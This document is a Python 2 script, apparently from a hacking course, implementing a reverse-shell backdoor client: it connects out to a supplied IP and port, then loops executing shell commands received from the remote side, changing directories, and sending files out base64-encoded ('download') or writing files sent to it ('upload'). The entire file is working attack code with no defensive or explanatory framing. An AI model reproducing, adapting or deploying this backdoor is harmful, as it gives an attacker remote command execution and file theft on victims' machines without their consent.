#!/usr/bin/env python

import socket, subprocess, json, sys, os, base64

class Connector:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        self.connection.send(json.dumps(data, encoding=sys.stdout.encoding))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data, encoding=sys.stdout.encoding)
            except ValueError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            print("ON")
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = subprocess.check_output(command, shell=True)
            self.reliable_send(command_result)
